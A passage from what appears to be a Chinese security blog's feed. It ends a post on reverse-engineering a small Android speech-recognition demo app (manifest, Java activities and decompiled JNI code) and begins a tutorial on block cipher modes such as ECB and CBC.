class="attr">package</span>=<span class="string">"xyz.konso.testsrtp"</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">"23"</span> <span class="attr">platformBuildVersionName</span>=<span class="string">"6.0-2166767"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">"15"</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">"23"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.RECORD_AUDIO"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_NETWORK_STATE"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_WIFI_STATE"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CHANGE_NETWORK_STATE"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_PHONE_STATE"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_FINE_LOCATION"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_CONTACTS"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CALL_PHONE"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BROADCAST_STICKY"</span> /&gt;</span></span><br><span class="line">    注：部分手机如无此权限会报错</span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BLUETOOTH"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.MODIFY_AUDIO_SETTINGS"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span> <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> <span class="attr">android:icon</span>=<span class="string">"@mipmap/icon"</span> <span class="attr">android:debuggable</span>=<span class="string">"true"</span> <span class="attr">android:allowBackup</span>=<span class="string">"true"</span> <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"xyz.konso.testsrtp.MainActivity"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.view"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"xyz.konso.testsrtp.SplashActivity"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> xyz.konso.testsrtp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.PackageManager.NameNotFoundException;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SplashActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        getWindow().setFlags(AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT, AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT);</span><br><span class="line">        setContentView(R.layout.activity_splash);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ((TextView) findViewById(R.id.versionNumber)).setText(<span class="string">"Version "</span> + getPackageManager().getPackageInfo(<span class="string">"com.lyt.android"</span>, <span class="number">0</span>).versionName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NameNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">new</span> Handler().postDelayed(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                SplashActivity.<span class="keyword">this</span>.startActivity(<span class="keyword">new</span> Intent(SplashActivity.<span class="keyword">this</span>, MainActivity.class));</span><br><span class="line">                SplashActivity.<span class="keyword">this</span>.finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">2500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> xyz.konso.testsrtp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.media.AudioManager;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> com.iflytek.cloud.InitListener;</span><br><span class="line"><span class="keyword">import</span> com.iflytek.cloud.RecognizerListener;</span><br><span class="line"><span class="keyword">import</span> com.iflytek.cloud.RecognizerResult;</span><br><span class="line"><span class="keyword">import</span> com.iflytek.cloud.SpeechConstant;</span><br><span class="line"><span class="keyword">import</span> com.iflytek.cloud.SpeechError;</span><br><span class="line"><span class="keyword">import</span> com.iflytek.cloud.SpeechRecognizer;</span><br><span class="line"><span class="keyword">import</span> com.iflytek.cloud.SpeechSynthesizer;</span><br><span class="line"><span class="keyword">import</span> com.iflytek.cloud.SpeechUtility;</span><br><span class="line"><span class="keyword">import</span> com.iflytek.cloud.SynthesizerListener;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String TAG = <span class="string">"shitou"</span>;</span><br><span class="line">    <span class="keyword">private</span> Button button1;</span><br><span class="line">    <span class="keyword">private</span> Button button2;</span><br><span class="line">    <span class="keyword">private</span> AudioManager mAudioManager;</span><br><span class="line">    <span class="keyword">private</span> SpeechRecognizer mIat;</span><br><span class="line">    <span class="keyword">private</span> InitListener mInitListener = <span class="keyword">new</span> InitListener() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onInit</span><span class="params">(<span class="keyword">int</span> code)</span> </span>&#123;</span><br><span class="line">            Log.d(MainActivity.<span class="keyword">this</span>.TAG, <span class="string">"SpeechRecognizer init() code = "</span> + code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">private</span> SynthesizerListener mSynListener = <span class="keyword">new</span> SynthesizerListener() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCompleted</span><span class="params">(SpeechError error)</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBufferProgress</span><span class="params">(<span class="keyword">int</span> percent, <span class="keyword">int</span> beginPos, <span class="keyword">int</span> endPos, String info)</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSpeakBegin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Log.d(MainActivity.<span class="keyword">this</span>.TAG, <span class="string">"speakcheck"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSpeakPaused</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSpeakProgress</span><span class="params">(<span class="keyword">int</span> percent, <span class="keyword">int</span> beginPos, <span class="keyword">int</span> endPos)</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSpeakResumed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEvent</span><span class="params">(<span class="keyword">int</span> arg0, <span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2, Bundle arg3)</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">private</span> SpeechSynthesizer mTts;</span><br><span class="line">    <span class="keyword">private</span> RecognizerListener recognizerListener = <span class="keyword">new</span> RecognizerListener() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBeginOfSpeech</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onError</span><span class="params">(SpeechError error)</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEndOfSpeech</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResult</span><span class="params">(RecognizerResult results, <span class="keyword">boolean</span> isLast)</span> </span>&#123;</span><br><span class="line">            Log.d(MainActivity.<span class="keyword">this</span>.TAG, results.getResultString());</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.ss = <span class="keyword">new</span> JSONObject(results.getResultString()).getJSONArray(<span class="string">"ws"</span>).getJSONObject(<span class="number">0</span>).getJSONArray(<span class="string">"cw"</span>).getJSONObject(<span class="number">0</span>).getString(<span class="string">"w"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                Log.d(MainActivity.<span class="keyword">this</span>.TAG, <span class="string">"catch Excepetion"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.ss.equals(<span class="string">"\u4f60\u597d"</span>)) &#123; <span class="comment">// 你好</span></span><br><span class="line">                MainActivity.<span class="keyword">this</span>.getsna();</span><br><span class="line">            &#125;</span><br><span class="line">            Log.d(MainActivity.<span class="keyword">this</span>.TAG, MainActivity.<span class="keyword">this</span>.ss);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onVolumeChanged</span><span class="params">(<span class="keyword">int</span> volume, <span class="keyword">byte</span>[] var2)</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEvent</span><span class="params">(<span class="keyword">int</span> eventType, <span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2, Bundle obj)</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">private</span> JSONObject res;</span><br><span class="line">    <span class="keyword">private</span> String ss;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(<span class="keyword">new</span> background(<span class="keyword">this</span>));</span><br><span class="line">        <span class="keyword">this</span>.mAudioManager = (AudioManager) getSystemService(<span class="string">"audio"</span>);</span><br><span class="line">        <span class="keyword">this</span>.mAudioManager.setBluetoothScoOn(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">this</span>.mAudioManager.startBluetoothSco();</span><br><span class="line">        SpeechUtility.createUtility(<span class="keyword">this</span>, <span class="string">"appid=561e6833"</span>);</span><br><span class="line">        <span class="keyword">this</span>.mIat = SpeechRecognizer.createRecognizer(<span class="keyword">this</span>, <span class="keyword">this</span>.mInitListener);</span><br><span class="line">        <span class="keyword">this</span>.mTts = SpeechSynthesizer.createSynthesizer(<span class="keyword">this</span>, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParam</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.mIat.setParameter(SpeechConstant.DOMAIN, <span class="string">"iat"</span>);</span><br><span class="line">        <span class="keyword">this</span>.mIat.setParameter(SpeechConstant.LANGUAGE, <span class="string">"zh_cn"</span>);</span><br><span class="line">        <span class="keyword">this</span>.mIat.setParameter(SpeechConstant.ACCENT, <span class="string">"mandarin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getsna</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">"haha"</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        <span class="keyword">this</span>.mAudioManager.setBluetoothScoOn(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">this</span>.mAudioManager.stopBluetoothSco();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">JNI_OnLoad</span><span class="params">(_JavaVM *vm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  jclass v2; <span class="comment">// r4</span></span><br><span class="line">  _JNIEnv *env; <span class="comment">// [sp+4h] [bp-Ch]</span></span><br><span class="line"></span><br><span class="line">  env = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (<span class="keyword">void</span> **)&amp;env, <span class="number">65540</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( byte_FF45C )</span><br><span class="line">    _android_log_write(<span class="number">3</span>, <span class="string">"MSC_LOG"</span>, <span class="string">"JNI_OnLoad is called !"</span>);</span><br><span class="line">  v2 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, <span class="string">"java/io/FileDescriptor"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 &amp;&amp; byte_FF45C )</span><br><span class="line">    _android_log_write(<span class="number">3</span>, <span class="string">"MSC_LOG"</span>, <span class="string">"Unable to find Java class java.io.FileDescriptor"</span>);</span><br><span class="line">  dword_FFC14 = (<span class="keyword">int</span>)env-&gt;functions-&gt;GetFieldID(&amp;env-&gt;functions, v2, <span class="string">"descriptor"</span>, <span class="string">"I"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_FFC14 || !byte_FF45C )             <span class="comment">// get descriptor in FileDescriptor and judge</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">65540</span>;</span><br><span class="line">  _android_log_write(<span class="number">3</span>, <span class="string">"MSC_LOG"</span>, <span class="string">"Unable to find descriptor field in java.io.FileDescriptor"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">65540</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.jianshu.com/p/a2f826064e29" target="_blank" rel="noopener">https://www.jianshu.com/p/a2f826064e29</a><br><a href="https://blog.csdn.net/jscese/article/details/51005447" target="_blank" rel="noopener">https://blog.csdn.net/jscese/article/details/51005447</a><br><a href="https://blog.csdn.net/zhuzhuzhu22/article/details/80306203" target="_blank" rel="noopener">https://blog.csdn.net/zhuzhuzhu22/article/details/80306203</a><br><a href="https://blog.csdn.net/ldpxxx/article/details/9253369" target="_blank" rel="noopener">https://blog.csdn.net/ldpxxx/article/details/9253369</a><br><a href="https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex" target="_blank" rel="noopener">https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex</a><br><a href="https://www.52pojie.cn/thread-1105062-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1105062-1-1.html</a><br><a href="https://blog.csdn.net/jason0539/article/details/10049899" target="_blank" rel="noopener">https://blog.csdn.net/jason0539/article/details/10049899</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;持续更新。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>分组密码的工作模式</title>
    <link href="blog.b3ale.cn/2020/02/17/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
    <id>blog.b3ale.cn/2020/02/17/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</id>
    <published>2020-02-17T14:30:05.000Z</published>
    <updated>2020-02-20T02:52:10.723Z</updated>
    
    <content type="html"><![CDATA[<p>复习一下密码学。</p><a id="more"></a><h1 id="分组密码的工作模式简介"><a href="#分组密码的工作模式简介" class="headerlink" title="分组密码的工作模式简介"></a>分组密码的工作模式简介</h1><p>密码学中，区块（block）密码的工作模式（mode of operation）允许使用同一个区块密码密钥对多于一块的数据进行加密，并保证其安全性。区块密码自身只能加密长度等于密码区块长度的单块数据，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适填充方式将数据扩展到符合密码块大小的长度。一种工作模式描述了加密每一数据块的过程，并常常使用基于一个通常称为初始化向量的附加输入值以进行随机化，以保证安全。</p><p>工作模式主要用来进行加密和认证。对加密模式的研究曾经包含数据的完整性保护，即在某些数据被修改后的情况下密码的误差传播特性。后来的研究则将完整性保护作为另一个完全不同的，与加密无关的密码学目标。部分现代的工作模式用有效的方法将加密和认证结合起来，称为认证加密模式。</p><p>虽然工作模式通常应用于对称加密，它亦可以应用于公钥加密，例如在原理上对 RSA 进行处理，但在实用中，公钥密码学通常不用于加密较长的信息，而是使用结合对称加密和公钥加密的混合加密方案。</p><h1 id="初始化向量（IV）"><a href="#初始化向量（IV）" class="headerlink" title="初始化向量（IV）"></a>初始化向量（IV）</h1><p>初始化向量（IV，Initialization Vector）是许多工作模式中用于将加密随机化的一个位块，由此即使同样的明文被多次加密也会产生不同的密文，避免了较慢的重新产生密钥的过程。</p><p>初始化向量与密钥相比有不同的安全性需求，因此 IV 通常无须保密，然而在大多数情况中，不应当在使用同一密钥的情况下两次使用同一个 IV。对于 CBC 和 CFB，重用 IV 会导致泄露明文首个块的某些信息，亦包括两个不同消息中相同的前缀。对于 OFB 和 CTR 而言，重用 IV 会导致完全失去安全性。另外，在 CBC 模式中，IV 在加密时必须是无法预测的；特别的，在许多实现中使用的产生 IV 的方法，例如 SSL2.0 使用的，即采用上一个消息的最后一块密文作为下一个消息的 IV，是不安全的。</p><h1 id="填充（padding）"><a href="#填充（padding）" class="headerlink" title="填充（padding）"></a>填充（padding）</h1><p>块密码只能对确定长度的数据块进行处理，而消息的长度通常是可变的。因此部分模式（即 ECB 和 CBC）需要最后一块在加密前进行填充。有数种填充方法，其中最简单的一种是在明文的最后填充空字符以使其长度为块长度的整数倍，但必须保证可以恢复明文的原始长度；例如，若明文是 C 语言风格的字符串，则只有串尾会有空字符。稍微复杂一点的方法则是原始的 DES 使用的方法，即在数据后添加一个 1 位，再添加足够的 0 位直到满足块长度的要求；若消息长度刚好符合块长度，则添加一个填充块。最复杂的则是针对 CBC 的方法，例如密文窃取，残块终结等，不会产生额外的密文，但会增加一些复杂度。布鲁斯·施奈尔和尼尔斯·弗格森提出了两种简单的可能性：添加一个值为 128 的字节（十六进制的 80），再以 0 字节填满最后一个块；或向最后一个块填充 n 个值均为 n 的字节。</p><p>CFB，OFB 和 CTR 模式不需要对长度不为密码块大小整数倍的消息进行特别的处理。因为这些模式是通过对块密码的输出与明文进行异或工作的。最后一个明文块（可能是不完整的）与密钥流块的前几个字节异或后，产生了与该明文块大小相同的密文块。流密码的这个特性使得它们可以应用在需要密文和明文数据长度严格相等的场合，也可以应用在以流形式传输数据而不便于进行填充的场合。</p><h1 id="常用模式"><a href="#常用模式" class="headerlink" title="常用模式"></a>常用模式</h1><h2 id="电子密码本（ECB）"><a href="#电子密码本（ECB）" class="headerlink" title="电子密码本（ECB）"></a>电子密码本（ECB）</h2><p>最简单的加密模式即为电子密码本（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。</p><p><img src="/pics/分组密码的工作模式/1.png" alt="ECB模式加密"></p><p><img src="/pics/分组密码的工作模式/2.png" alt="ECB模式解密"></p><p>ECB 的缺点在于同样的明文块会被加密成相同的密文块，因此它不能很好的隐藏数据模式。在某些场合，这种方法不能提供严格的数据保密性，因此并不推荐用于密码协议中。</p><p>ECB 模式也会导致使用它的协议不能提供数据完整性保护，易受到重放攻击的影响，因此每个块是以完全相同的方式解密的。例如，“梦幻之星在线：蓝色脉冲”在线电子游戏使用 ECB 模式的 Blowfish 密码。在密钥交换系统被破解而产生更简单的破解方式前，作弊者重复通过发送加密的“杀死怪物”消息包以非法的快速增加经验值。</p><h2 id="密码块链接（CBC）"><a href="#密码块链接（CBC）" class="headerlink" title="密码块链接（CBC）"></a>密码块链接（CBC）</h2><p>1976 年，IBM 发明了密码分组链接（CBC，Cipher-block chaining）模式。在 CBC 模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p><p><img src="/pics/分组密码的工作模式/3.png" alt="CBC模式加密"></p><p><img src="/pics/分组密码的工作模式/4.png" alt="CBC模式解密"></p><p>若第一个块的下标为 1，则 CBC 模式的加密过程如下：</p><p>$$<br>C_i = E_K(P_i \oplus IV) \\<br>IV = C_i<br>$$</p><p>其解密过程如下：</p><p>$$<br>P_i = D_K(C_i) \oplus IV \\<br>IV = C_i<br>$$</p><p>CBC 是最为常用的工作模式。它的主要缺点在于加密过程是串行的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。</p><p>注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。</p><h2 id="填充密码块链接（PCBC）"><a href="#填充密码块链接（PCBC）" class="headerlink" 